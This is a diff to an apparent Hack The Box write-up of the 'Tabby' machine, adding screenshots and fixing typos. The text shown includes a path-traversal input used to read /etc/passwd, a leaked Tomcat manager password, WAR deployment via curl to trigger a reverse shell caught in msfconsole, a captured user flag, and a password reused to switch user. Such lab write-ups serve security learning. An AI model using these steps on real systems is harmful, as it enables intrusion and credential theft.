@@ -87,21 +87,41 @@ Nmap done: 1 IP address (1 host up) scanned in 86.69 seconds
 
 /var/lib/tomcat9/webapps/ROOT/index.html
 
-[http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement)
-
 added megahosting.htb to hosts file
 
+![](../../.gitbook/assets/1-tabby-hosting.png)
+
 > We have recently upgraded several services. Our servers are now more secure than ever. Read our statement on recovering from the data breach
+
+[http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement)
+
+![](../../.gitbook/assets/3-breach-news.png)
 
 recently had a breach of some sort [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) replaced 'statement' with ../../../../etc/passwd and got the file
 
 found username `ash`
 
+![](../../.gitbook/assets/2-8080-manager.png)
+
+![](../../.gitbook/assets/2-8080-manager-unauth.png)
+
 [http://10.10.10.194:8080/docs/host-manager-howto.html](http://10.10.10.194:8080/docs/host-manager-howto.html)
+
+![](../../.gitbook/assets/4-tomcat-users%20%281%29.png)
 
 `<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"> </user>`
 
+![](../../.gitbook/assets/5-complete-server-status%20%281%29.png)
+
+![](../../.gitbook/assets/5-server-information%20%281%29.png)
+
+![](../../.gitbook/assets/5-tomcat-manager.png)
+
+
+
 how to use curl to send package to server
+
+![](../../.gitbook/assets/6-addhost.png)
 
 ```text
 Add command
@@ -184,9 +204,11 @@ started my handler in msfconsole
     to edit the Host Manager's <tt>context.xml</tt> file.
 ```
 
-upload did not work as in the Windows example, kept reading in the documentation, and found a way to deply directly, without adding first
+upload did not work as in the Windows example, kept reading in the documentation, and found a way to deploy directly, without adding first
 
 [http://10.10.10.194:8080/docs/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_\(WAR\)\_Remotely](http://10.10.10.194:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely)
+
+![](../../.gitbook/assets/7-manager-deploy.png)
 
 In order to send the file
 
@@ -208,7 +230,7 @@ I checked the man page for the correct options and found `-T`
 OK - Deployed application at context path [/CRash]
 ```
 
-after troublehsooting...I realized that my payload was set to be run in the context of a linux machine, however, this was being run as a java file \(after the .war was unpacked, running on the web server\) sop I changed my payload and tried again
+after troubleshooting...I realized that my payload was set to be run in the context of a linux machine, however, this was being run as a java file \(after the .war was unpacked, running on the web server\) so I changed my payload and tried again
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
@@ -225,7 +247,9 @@ next I uploaded the new version \(had to change the name since the old one still
 └─$ curl http://10.10.10.194:8080/CRash2/
 ```
 
-Then I activated my reverse shell by curling the url \[make sure to put the trailing `/`, it looks like it is doing something, but will give no output and wont work without it!!\]
+Then I activated my reverse shell by curling the  
+
+\[make sure to put the trailing `/`, it looks like it is doing something, but will give no output and wont work without it!!\]
 
 ## Initial Foothold
 
@@ -277,7 +301,7 @@ msf5 exploit(multi/handler) > sessions 2
 meterpreter >
 ```
 
-setting stty raw -echo broke my nc shell, so I switched to msfconsole \(I think I may have had this problem with zsh before, will have to try with bash and see if it works properly\)
+setting `stty raw -echo` broke my nc shell, so I switched to msfconsole \(I think I may have had this problem with zsh before, will have to try with bash and see if it works properly\)
 
 ## Road to User
 
@@ -462,9 +486,15 @@ Archive:  16162020_backup.zip
   inflating: var/www/html/Readme.txt
 ```
 
-The index.php file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.
+![](../../.gitbook/assets/9-zip.png)
 
-### Finding user creds
+
+
+![](../../.gitbook/assets/10-digitallandscape.png)
+
+The `index.php` file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.
+
+### URLFinding user creds
 
 ### User.txt
 
@@ -489,7 +519,7 @@ ash@tabby:~$ cat user.txt
 e33e9ee57fa4cba7975b70a784092efa
 ```
 
-The zip file seemed to be a dead-end, so I decided to try to use the password I had found on the only user I knew `ash`, and was able to `su` over to that user!
+The zip file seemed to be a dead-end, so I decided to try to use the password I had found on the only user I knew, `ash`, and was able to `su` over to that user!
 
 ## Path to Power \(Gaining Administrator Access\)
 
